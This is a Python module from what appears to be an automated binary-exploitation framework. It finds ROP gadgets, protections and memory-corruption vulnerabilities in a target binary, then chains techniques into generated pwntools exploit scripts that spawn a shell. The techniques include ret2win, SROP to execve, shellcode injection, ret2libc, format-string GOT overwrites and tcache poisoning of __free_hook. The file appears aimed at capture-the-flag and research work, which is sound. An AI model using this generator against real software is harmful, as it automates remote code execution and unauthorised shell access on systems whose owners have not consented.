"""
Technique Chainer - Automatically chain exploitation primitives.

Orchestrates multiple exploitation techniques to achieve code execution:
1. Identify available primitives (leak, read, write, exec)
2. Build exploitation chains (leak → compute → write → exec)
3. Select optimal technique combinations
4. Generate complete exploit scripts
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Tuple, Set

from supwngo.core.binary import Binary
from supwngo.core.context import ExploitContext
from supwngo.vulns.detector import Vulnerability, VulnType, ExploitPrimitive
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class PrimitiveType(Enum):
    """Types of exploitation primitives."""
    LEAK = auto()        # Leak memory content
    READ = auto()        # Read arbitrary memory
    WRITE = auto()       # Write to arbitrary address
    EXEC = auto()         # Execute code/function
    OVERFLOW = auto()    # Buffer overflow (raw)
    FORMAT_STRING = auto()  # Format string
    HEAP_CORRUPT = auto()  # Heap metadata corruption


class ChainStage(Enum):
    """Stages in exploitation chain."""
    INFO_LEAK = auto()      # Leak addresses (ASLR bypass)
    COMPUTE = auto()        # Calculate targets from leaks
    PRIMITIVE_BUILD = auto()  # Build write/exec primitive
    PAYLOAD_DELIVER = auto()  # Deliver final payload
    TRIGGER = auto()        # Trigger execution


@dataclass
class Primitive:
    """Represents an exploitation primitive."""
    primitive_type: PrimitiveType
    address: int = 0           # Address involved (if applicable)
    controllable: bool = False  # Can control target/value
    constraints: Dict[str, Any] = field(default_factory=dict)
    method: str = ""           # How to invoke this primitive
    source_vuln: Optional[Vulnerability] = None


@dataclass
class ChainLink:
    """Single step in an exploitation chain."""
    stage: ChainStage
    primitive: Primitive
    input_from: List[str] = field(default_factory=list)  # Dependencies
    output_to: List[str] = field(default_factory=list)   # What this provides
    code: str = ""              # Code snippet for this step
    description: str = ""


@dataclass
class ExploitChain:
    """Complete exploitation chain."""
    links: List[ChainLink] = field(default_factory=list)
    target_binary: str = ""
    success_probability: float = 0.0
    requires_brute_force: bool = False
    brute_force_bits: int = 0
    notes: List[str] = field(default_factory=list)

    def add_link(self, link: ChainLink) -> None:
        """Add a link to the chain."""
        self.links.append(link)

    def get_stages(self) -> List[ChainStage]:
        """Get list of stages in this chain."""
        return [link.stage for link in self.links]

    def generate_script(self) -> str:
        """Generate exploit script from chain."""
        script_parts = [
            "#!/usr/bin/env python3",
            "from pwn import *",
            "",
            f"# Exploit chain for {self.target_binary}",
            f"# Success probability: {self.success_probability:.1%}",
            "",
        ]

        for i, link in enumerate(self.links):
            script_parts.append(f"# Stage {i+1}: {link.stage.name}")
            script_parts.append(f"# {link.description}")
            if link.code:
                script_parts.append(link.code)
            script_parts.append("")

        return "\n".join(script_parts)


class TechniqueRegistry:
    """Registry of available exploitation techniques."""

    def __init__(self):
        self._techniques: Dict[str, Dict[str, Any]] = {}
        self._register_builtin_techniques()

    def _register_builtin_techniques(self):
        """Register built-in techniques."""
        # Leak techniques
        self.register("puts_leak", {
            "provides": [PrimitiveType.LEAK],
            "requires": ["puts@plt", "pop_rdi_gadget"],
            "aslr_bypass": True,
            "description": "Leak libc address via puts(got_entry)",
        })

        self.register("printf_leak", {
            "provides": [PrimitiveType.LEAK],
            "requires": ["printf@plt"],
            "aslr_bypass": True,
            "description": "Leak via format string %p/%s",
        })

        self.register("write_leak", {
            "provides": [PrimitiveType.LEAK],
            "requires": ["write@plt", "pop_rdi_gadget", "pop_rsi_gadget"],
            "aslr_bypass": True,
            "description": "Leak via write(1, got_entry, 8)",
        })

        # Write techniques
        self.register("fmt_write", {
            "provides": [PrimitiveType.WRITE],
            "requires": ["format_string_vuln"],
            "description": "Write via format string %n",
        })

        self.register("got_overwrite", {
            "provides": [PrimitiveType.WRITE, PrimitiveType.EXEC],
            "requires": ["write_primitive", "partial_relro_or_none"],
            "description": "Overwrite GOT entry to redirect calls",
        })

        self.register("ret2libc", {
            "provides": [PrimitiveType.EXEC],
            "requires": ["libc_base", "pop_rdi_gadget", "overflow"],
            "description": "Call system('/bin/sh') via ROP",
        })

        self.register("one_gadget", {
            "provides": [PrimitiveType.EXEC],
            "requires": ["libc_base", "write_primitive"],
            "description": "Jump to one_gadget in libc",
        })

        self.register("ret2win", {
            "provides": [PrimitiveType.EXEC],
            "requires": ["win_function", "overflow"],
            "description": "Return to win function",
        })

        self.register("shellcode", {
            "provides": [PrimitiveType.EXEC],
            "requires": ["rwx_memory", "overflow_or_write"],
            "description": "Execute shellcode in RWX region",
        })

        self.register("srop", {
            "provides": [PrimitiveType.EXEC],
            "requires": ["sigreturn_gadget", "syscall_gadget", "overflow"],
            "description": "SROP to execve",
        })

        # Heap techniques
        self.register("tcache_poison", {
            "provides": [PrimitiveType.WRITE],
            "requires": ["heap_uaf", "tcache_enabled"],
            "description": "Poison tcache to get arbitrary alloc",
        })

        self.register("fastbin_dup", {
            "provides": [PrimitiveType.WRITE],
            "requires": ["double_free", "fastbin_enabled"],
            "description": "Fastbin duplication for arbitrary alloc",
        })

        self.register("house_of_force", {
            "provides": [PrimitiveType.WRITE],
            "requires": ["heap_overflow", "top_chunk_access"],
            "description": "Corrupt top chunk for arbitrary alloc",
        })

    def register(self, name: str, info: Dict[str, Any]):
        """Register a technique."""
        self._techniques[name] = info

    def get(self, name: str) -> Optional[Dict[str, Any]]:
        """Get technique info."""
        return self._techniques.get(name)

    def find_by_provides(self, primitive_type: PrimitiveType) -> List[str]:
        """Find techniques that provide a primitive type."""
        result = []
        for name, info in self._techniques.items():
            if primitive_type in info.get("provides", []):
                result.append(name)
        return result

    def find_applicable(
        self,
        available: Set[str],
        goal: PrimitiveType,
    ) -> List[str]:
        """
        Find techniques applicable given available resources.

        Args:
            available: Set of available resources/primitives
            goal: Desired primitive type

        Returns:
            List of applicable technique names
        """
        result = []
        for name, info in self._techniques.items():
            if goal not in info.get("provides", []):
                continue

            # Check if all requirements are met
            requirements = info.get("requires", [])
            if all(req in available for req in requirements):
                result.append(name)

        return result


class ExploitChainer:
    """
    Automatically chain exploitation primitives.

    Analyzes available primitives and builds optimal exploitation chains.
    """

    def __init__(
        self,
        binary: Binary,
        context: Optional[ExploitContext] = None,
    ):
        """
        Initialize chainer.

        Args:
            binary: Target binary
            context: Exploitation context (created if not provided)
        """
        self.binary = binary
        self.context = context or ExploitContext(
            arch="amd64" if binary.bits == 64 else "i386",
            bits=binary.bits,
        )
        self.registry = TechniqueRegistry()
        self._available: Set[str] = set()
        self._primitives: List[Primitive] = []
        self._chains: List[ExploitChain] = []

    def analyze(self, vulnerabilities: List[Vulnerability] = None) -> None:
        """
        Analyze binary and vulnerabilities to determine available primitives.

        Args:
            vulnerabilities: List of detected vulnerabilities
        """
        # Analyze binary features
        self._analyze_binary_features()

        # Analyze vulnerabilities
        if vulnerabilities:
            self._analyze_vulnerabilities(vulnerabilities)

        logger.info(f"Available resources: {self._available}")

    def _analyze_binary_features(self) -> None:
        """Analyze binary features."""
        # Check PLT entries
        if hasattr(self.binary, 'plt'):
            for func in self.binary.plt:
                self._available.add(f"{func}@plt")

        # Check protections
        protections = self.binary.protections
        if not protections.nx:
            self._available.add("rwx_memory")
        if not protections.pie:
            self._available.add("static_addresses")
        if protections.relro == "none" or protections.relro == "partial":
            self._available.add("partial_relro_or_none")
        if not protections.canary:
            self._available.add("no_canary")

        # Check for gadgets
        try:
            from supwngo.exploit.rop.gadgets import GadgetFinder
            finder = GadgetFinder(self.binary)
            finder.find_gadgets()

            if finder.find_pop_reg('rdi'):
                self._available.add("pop_rdi_gadget")
            if finder.find_pop_reg('rsi'):
                self._available.add("pop_rsi_gadget")
            if finder.find_ret():
                self._available.add("ret_gadget")
            if finder.find_syscall():
                self._available.add("syscall_gadget")
                self._available.add("sigreturn_gadget")  # Can use syscall for sigreturn
        except Exception as e:
            logger.debug(f"Gadget analysis failed: {e}")

        # Check for win function
        win_names = ["win", "flag", "shell", "get_flag", "print_flag", "backdoor"]
        if hasattr(self.binary, 'symbols'):
            for name in win_names:
                if name in self.binary.symbols:
                    self._available.add("win_function")
                    break

    def _analyze_vulnerabilities(self, vulns: List[Vulnerability]) -> None:
        """Analyze vulnerabilities for primitives."""
        for vuln in vulns:
            if vuln.vuln_type == VulnType.STACK_BUFFER_OVERFLOW:
                self._available.add("overflow")
                self._primitives.append(Primitive(
                    primitive_type=PrimitiveType.OVERFLOW,
                    controllable=True,
                    source_vuln=vuln,
                ))

            elif vuln.vuln_type == VulnType.FORMAT_STRING:
                self._available.add("format_string_vuln")
                self._primitives.append(Primitive(
                    primitive_type=PrimitiveType.FORMAT_STRING,
                    controllable=True,
                    source_vuln=vuln,
                ))

            elif vuln.vuln_type == VulnType.USE_AFTER_FREE:
                self._available.add("heap_uaf")
                self._primitives.append(Primitive(
                    primitive_type=PrimitiveType.HEAP_CORRUPT,
                    controllable=True,
                    source_vuln=vuln,
                ))

            elif vuln.vuln_type == VulnType.DOUBLE_FREE:
                self._available.add("double_free")
                self._primitives.append(Primitive(
                    primitive_type=PrimitiveType.HEAP_CORRUPT,
                    controllable=True,
                    source_vuln=vuln,
                ))

            elif vuln.vuln_type == VulnType.HEAP_BUFFER_OVERFLOW:
                self._available.add("heap_overflow")
                self._primitives.append(Primitive(
                    primitive_type=PrimitiveType.OVERFLOW,
                    controllable=True,
                    source_vuln=vuln,
                ))

    def build_chains(self) -> List[ExploitChain]:
        """
        Build possible exploitation chains.

        Returns:
            List of possible exploit chains
        """
        chains = []

        # Try direct execution (no leaks needed)
        direct_chain = self._try_direct_chain()
        if direct_chain:
            chains.append(direct_chain)

        # Try leak-based chains
        leak_chains = self._try_leak_chains()
        chains.extend(leak_chains)

        # Try heap-based chains
        heap_chains = self._try_heap_chains()
        chains.extend(heap_chains)

        # Sort by success probability
        chains.sort(key=lambda c: c.success_probability, reverse=True)

        self._chains = chains
        return chains

    def _try_direct_chain(self) -> Optional[ExploitChain]:
        """Try to build a direct exploitation chain (no ASLR bypass needed)."""
        # ret2win is simplest
        if "win_function" in self._available and "overflow" in self._available:
            chain = ExploitChain(target_binary=str(self.binary.path))
            chain.add_link(ChainLink(
                stage=ChainStage.PAYLOAD_DELIVER,
                primitive=Primitive(PrimitiveType.OVERFLOW, controllable=True),
                description="Overflow buffer to overwrite return address",
                code="payload = b'A' * offset + p64(win_addr)",
            ))
            chain.add_link(ChainLink(
                stage=ChainStage.TRIGGER,
                primitive=Primitive(PrimitiveType.EXEC),
                description="Return to win function",
                code="p.sendline(payload)",
            ))
            chain.success_probability = 0.95 if "no_canary" in self._available else 0.1
            chain.notes.append("Direct ret2win - no ASLR bypass needed")
            return chain

        # SROP for static binaries
        if "syscall_gadget" in self._available and "overflow" in self._available:
            if "static_addresses" in self._available:
                chain = ExploitChain(target_binary=str(self.binary.path))
                chain.add_link(ChainLink(
                    stage=ChainStage.PAYLOAD_DELIVER,
                    primitive=Primitive(PrimitiveType.OVERFLOW, controllable=True),
                    description="Build SROP frame for execve",
                    code="""
frame = SigreturnFrame()
frame.rax = 59  # execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget
payload = b'A' * offset + p64(pop_rax) + p64(15) + p64(syscall_gadget) + bytes(frame)
""",
                ))
                chain.success_probability = 0.9
                chain.notes.append("SROP - static binary with syscall gadget")
                return chain

        # Shellcode injection
        if "rwx_memory" in self._available and "overflow" in self._available:
            chain = ExploitChain(target_binary=str(self.binary.path))
            chain.add_link(ChainLink(
                stage=ChainStage.PAYLOAD_DELIVER,
                primitive=Primitive(PrimitiveType.OVERFLOW, controllable=True),
                description="Inject shellcode and jump to it",
                code="""
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(offset, b'\\x90') + p64(buffer_addr)
""",
            ))
            chain.success_probability = 0.85
            chain.notes.append("Shellcode injection - NX disabled")
            return chain

        return None

    def _try_leak_chains(self) -> List[ExploitChain]:
        """Build chains that require address leaks."""
        chains = []

        # Leak techniques available
        leak_techniques = []
        if "puts@plt" in self._available and "pop_rdi_gadget" in self._available:
            leak_techniques.append("puts_leak")
        if "printf@plt" in self._available:
            leak_techniques.append("printf_leak")
        if "format_string_vuln" in self._available:
            leak_techniques.append("fmt_leak")

        if not leak_techniques:
            return chains

        # ret2libc chain
        if "overflow" in self._available and "pop_rdi_gadget" in self._available:
            for leak in leak_techniques:
                chain = ExploitChain(target_binary=str(self.binary.path))

                # Leak stage
                chain.add_link(ChainLink(
                    stage=ChainStage.INFO_LEAK,
                    primitive=Primitive(PrimitiveType.LEAK),
                    description=f"Leak libc address using {leak}",
                    output_to=["libc_base"],
                ))

                # Compute stage
                chain.add_link(ChainLink(
                    stage=ChainStage.COMPUTE,
                    primitive=Primitive(PrimitiveType.LEAK),
                    input_from=["libc_base"],
                    description="Calculate system and /bin/sh addresses",
                    output_to=["system_addr", "binsh_addr"],
                    code="libc.address = leaked_addr - libc.symbols['puts']",
                ))

                # Execute stage
                chain.add_link(ChainLink(
                    stage=ChainStage.PAYLOAD_DELIVER,
                    primitive=Primitive(PrimitiveType.EXEC),
                    input_from=["system_addr", "binsh_addr"],
                    description="ROP to system('/bin/sh')",
                    code="rop = p64(pop_rdi) + p64(binsh) + p64(system)",
                ))

                chain.success_probability = 0.7
                chain.notes.append(f"ret2libc via {leak}")
                chains.append(chain)

        # Format string GOT overwrite
        if "format_string_vuln" in self._available:
            chain = ExploitChain(target_binary=str(self.binary.path))

            chain.add_link(ChainLink(
                stage=ChainStage.INFO_LEAK,
                primitive=Primitive(PrimitiveType.FORMAT_STRING),
                description="Leak addresses via format string",
                output_to=["libc_base"],
            ))

            chain.add_link(ChainLink(
                stage=ChainStage.PRIMITIVE_BUILD,
                primitive=Primitive(PrimitiveType.WRITE),
                input_from=["libc_base"],
                description="Overwrite GOT entry with system/one_gadget",
                code="payload = fmtstr_payload(offset, {got_entry: target_addr})",
            ))

            chain.success_probability = 0.65
            chain.notes.append("Format string GOT overwrite")
            chains.append(chain)

        return chains

    def _try_heap_chains(self) -> List[ExploitChain]:
        """Build heap-based exploitation chains."""
        chains = []

        # tcache poisoning
        if "heap_uaf" in self._available or "double_free" in self._available:
            chain = ExploitChain(target_binary=str(self.binary.path))

            chain.add_link(ChainLink(
                stage=ChainStage.INFO_LEAK,
                primitive=Primitive(PrimitiveType.HEAP_CORRUPT),
                description="Leak heap/libc addresses via UAF read",
                output_to=["heap_base", "libc_base"],
            ))

            chain.add_link(ChainLink(
                stage=ChainStage.PRIMITIVE_BUILD,
                primitive=Primitive(PrimitiveType.WRITE),
                input_from=["libc_base"],
                description="Poison tcache to allocate at __free_hook",
                code="""
# Free chunk to tcache
free(chunk_a)
# UAF write to corrupt fd pointer
edit(chunk_a, p64(free_hook))
# Allocate twice to get chunk at free_hook
alloc(); target = alloc()
write(target, p64(system))
""",
            ))

            chain.add_link(ChainLink(
                stage=ChainStage.TRIGGER,
                primitive=Primitive(PrimitiveType.EXEC),
                description="Trigger __free_hook(shell_string)",
                code="free(shell_chunk)  # calls system('/bin/sh')",
            ))

            chain.success_probability = 0.6
            chain.notes.append("tcache poisoning to __free_hook")
            chains.append(chain)

        return chains

    def get_best_chain(self) -> Optional[ExploitChain]:
        """Get the highest probability chain."""
        if not self._chains:
            self.build_chains()
        return self._chains[0] if self._chains else None

    def generate_exploit(self, chain: Optional[ExploitChain] = None) -> str:
        """
        Generate complete exploit script.

        Args:
            chain: Chain to use (uses best if not specified)

        Returns:
            Python exploit script
        """
        if chain is None:
            chain = self.get_best_chain()

        if chain is None:
            return "# No viable exploitation chain found"

        return chain.generate_script()


def chain_primitives(
    binary: Binary,
    vulnerabilities: List[Vulnerability],
) -> Optional[ExploitChain]:
    """
    Convenience function to chain exploitation primitives.

    Args:
        binary: Target binary
        vulnerabilities: Detected vulnerabilities

    Returns:
        Best exploitation chain or None
    """
    chainer = ExploitChainer(binary)
    chainer.analyze(vulnerabilities)
    return chainer.get_best_chain()


def suggest_techniques(
    binary: Binary,
    goal: str = "shell",
) -> List[str]:
    """
    Suggest applicable techniques for a binary.

    Args:
        binary: Target binary
        goal: Exploitation goal ("shell", "leak", "write")

    Returns:
        List of suggested technique names
    """
    chainer = ExploitChainer(binary)
    chainer.analyze()

    goal_map = {
        "shell": PrimitiveType.EXEC,
        "leak": PrimitiveType.LEAK,
        "write": PrimitiveType.WRITE,
        "read": PrimitiveType.READ,
    }

    primitive_type = goal_map.get(goal, PrimitiveType.EXEC)
    return chainer.registry.find_applicable(chainer._available, primitive_type)
